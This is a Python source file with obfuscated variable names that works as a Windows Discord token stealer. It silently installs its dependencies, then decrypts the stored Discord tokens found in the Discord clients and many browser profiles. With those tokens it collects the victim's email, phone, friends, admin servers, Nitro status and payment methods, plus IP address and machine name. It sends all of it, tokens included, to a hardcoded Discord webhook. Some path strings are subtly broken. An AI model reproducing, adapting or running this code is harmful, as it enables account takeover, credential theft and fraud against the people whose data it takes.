import os

if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime


def _0x1a3f(modules):
    for _0x2d, _0x1e in modules:
        try:
            __import__(_0x2d)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", _0x1e], stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)


_0x1a3f([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

_0x3a = os.getenv("LOCALAPPDATA")
_0x4b = os.getenv("APPDATA")
_0x5c = {
    'Discord': _0x4b + '\\discord',
    'Discord Canary': _0x4b + '\\discordcanary',
    'Lightcord': _0x4b + '\\Lightcord',
    'Discord PTB': _0x4b + '\\discordptb',
    'Opera': _0x4b + '\\Opera Software\\Opera Stable',
    'Opera GX': _0x4b + '\\Opera Software\\Opera GX Stable',
    'Amigo': _0x3a + '\\Amigo\\User Data',
    'Torch': _0x3a + '\\Torch\\User Data',
    'Kometa': _0x3a + '\\Kometa\\User Data',
    'Orbitum': _0x3a + '\\Orbitum\\User Data',
    'CentBrowser': _0x3a + '\\CentBrowser\\User Data',
    '7Star': _0x3a + '\\7Star\\7Star\\User Data',
    'Sputnik': _0x3a + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': _0x3a + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': _0x3a + '\\Google\\Chrome SxS\\User Data',
    'Chrome': _0x3a + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': _0x3a + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': _0x3a + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': _0x3a + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': _0x3a + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': _0x3a + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': _0x3a + '\\Iridium\\User Data\\Default'
}


def _0x6d(_0x7e=None):
    _0x8f = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if _0x7e:
        _0x8f.update({"Authorization": _0x7e})

    return _0x8f


def _0x9a(_0xab):
    _0xab += "\\Local Storage\\leveldb\\"
    _0xbc = []

    if not os.path.exists(_0xab):
        return _0xbc

    for _0xcd in os.listdir(_0xab):
        if not _0xcd.endswith(".ldb") and _0xcd.endswith(".log"):
            continue

        try:
            with open(f"{_0xab}{_0xcd}", "r", errors="ignore") as _0xde:
                for _0xef in (_0x100.strip() for _0x100 in _0xde.readlines()):
                    for _0x111 in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", _0xef):
                        _0xbc.append(_0x111)
        except PermissionError:
            continue

    return _0xbc


def _0x122(_0xab):
    with open(_0xab + f"\\Local State", "r") as _0x133:
        _0x144 = json.loads(_0x133.read())['os_crypt']['encrypted_key']
        _0x133.close()

    return _0x144


def _0x155():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as _0x166:
            return json.loads(_0x166.read().decode()).get("ip")
    except:
        return "None"


def _0x177():
    _0x188 = []

    for _0x199, _0x1aa in _0x5c.items():
        if not os.path.exists(_0x1aa):
            continue

        for _0x1bb in _0x9a(_0x1aa):
            _0x1bb = _0x1bb.replace("\\", "") if _0x1bb.endswith("\\") else _0x1bb

            try:
                _0x1bb = AES.new(
                    win32crypt.CryptUnprotectData(base64.b64decode(_0x122(_0x1aa))[5:], None, None, None, 0)[1],
                    AES.MODE_GCM, base64.b64decode(_0x1bb.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(
                    base64.b64decode(_0x1bb.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if _0x1bb in _0x188:
                    continue
                _0x188.append(_0x1bb)

                _0x1cc = urllib.request.urlopen(
                    urllib.request.Request('https://discord.com/api/v10/users/@me', headers=_0x6d(_0x1bb)))
                if _0x1cc.getcode() != 200:
                    continue
                _0x1dd = json.loads(_0x1cc.read().decode())

                _0x1ee = ""
                _0x1ff = _0x1dd['flags']
                if _0x1ff == 64 or _0x1ff == 96:
                    _0x1ee += ":BadgeBravery: "
                if _0x1ff == 128 or _0x1ff == 160:
                    _0x1ee += ":BadgeBrilliance: "
                if _0x1ff == 256 or _0x1ff == 288:
                    _0x1ee += ":BadgeBalance: "

                _0x1dd = json.loads(urllib.request.urlopen(
                    urllib.request.Request('https://discordapp.com/api/v6/users/@me/relationships',
                                           headers=_0x6d(_0x1bb))).read().decode())
                _0x210 = len([_0x221 for _0x221 in _0x1dd if _0x221['type'] == 1])

                _0x232 = urllib.parse.urlencode({"with_counts": True})
                _0x1dd = json.loads(urllib.request.urlopen(
                    urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{_0x232}',
                                           headers=_0x6d(_0x1bb))).read().decode())
                _0x243 = len(_0x1dd)
                _0x254 = ""

                for _0x265 in _0x1dd:
                    if _0x265['permissions'] & 8 or _0x265['permissions'] & 32:
                        _0x1dd = json.loads(urllib.request.urlopen(
                            urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{_0x265["id"]}',
                                                   headers=_0x6d(_0x1bb))).read().decode())
                        _0x276 = ""

                        if _0x1dd["vanity_url_code"] != None:
                            _0x276 = f"""; .gg/{_0x1dd["vanity_url_code"]}"""

                        _0x254 += f"""\nㅤ- [{_0x265['name']}]: {_0x265['approximate_member_count']}{_0x276}"""
                if _0x254 == "":
                    _0x254 = "No guilds"

                _0x1dd = json.loads(urllib.request.urlopen(
                    urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                                           headers=_0x6d(_0x1bb))).read().decode())
                _0x287 = False
                _0x287 = bool(len(_0x1dd) > 0)
                _0x298 = None
                if _0x287:
                    _0x1ee += f":BadgeSubscriber: "
                    _0x298 = datetime.datetime.strptime(_0x1dd[0]["current_period_end"],
                                                          "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                _0x1dd = json.loads(urllib.request.urlopen(
                    urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
                                           headers=_0x6d(_0x1bb))).read().decode())
                _0x2a9 = 0
                _0x2ba = ""
                _0x2cb = False
                for _0x2dc in _0x1dd:
                    _0x2ed = datetime.datetime.strptime(_0x2dc["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if _0x2ed - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        _0x2ba += f"ㅤ- Available now\n"
                        _0x2a9 += 1
                    else:
                        _0x2ba += f"ㅤ- Available on {_0x2ed.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    _0x2cb = True
                if _0x2cb:
                    _0x1ee += f":BadgeBoost: "

                _0x2fe = 0
                _0x30f = ""
                _0x320 = 0
                for _0x331 in json.loads(urllib.request.urlopen(
                        urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources',
                                               headers=_0x6d(_0x1bb))).read().decode()):
                    if _0x331['type'] == 1:
                        _0x30f += "CreditCard "
                        if not _0x331['invalid']:
                            _0x320 += 1
                        _0x2fe += 1
                    elif _0x331['type'] == 2:
                        _0x30f += "PayPal "
                        if not _0x331['invalid']:
                            _0x320 += 1
                        _0x2fe += 1

                _0x342 = f"\nNitro Informations:\n```yaml\nHas Nitro: {_0x287}\nExpiration Date: {_0x298}\nBoosts Available: {_0x2a9}\n{_0x2ba if _0x2cb else ''}\n```"
                _0x353 = f"\nNitro Informations:\n```yaml\nBoosts Available: {_0x2a9}\n{_0x2ba if _0x2cb else ''}\n```"
                _0x364 = f"\nPayment Methods:\n```yaml\nAmount: {_0x2fe}\nValid Methods: {_0x320} method(s)\nType: {_0x30f}\n```"
                _0x375 = {
                    'embeds': [
                        {
                            'title': f"**New user data: {_0x1dd['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {_0x1dd['id']}\nEmail: {_0x1dd['email']}\nPhone Number: {_0x1dd['phone']}\n\nFriends: {_0x210}\nGuilds: {_0x243}\nAdmin Permissions: {_0x254}\n``` ```yaml\nMFA Enabled: {_0x1dd['mfa_enabled']}\nFlags: {_0x1ff}\nLocale: {_0x1dd['locale']}\nVerified: {_0x1dd['verified']}\n```{_0x342 if _0x287 else _0x353 if _0x2a9 > 0 else ""}{_0x364 if _0x2fe > 0 else ""}```yaml\nIP: {_0x155()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {_0x199}\n```Token: \n```yaml\n{_0x1bb}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "wiga boss"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{_0x1dd['id']}/{_0x1dd['avatar']}.png"
                            }
                        }
                    ],
                    "username": "BOSS",
                    "avatar_url": ""
                }

                urllib.request.urlopen(
                    urllib.request.Request('https://discord.com/api/webhooks/1366417555031326790/ZZ46qulVAw1WmAEN8JND8cXXtMQt2pTvnhow6th5z51iGsJcE0aYNJ318IJURNW4jT3H', data=json.dumps(_0x375).encode('utf-8'),
                                           headers=_0x6d(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as _0x386:
                print(f"ERROR: {_0x386}")
                continue


if __name__ == "__main__":
    _0x177()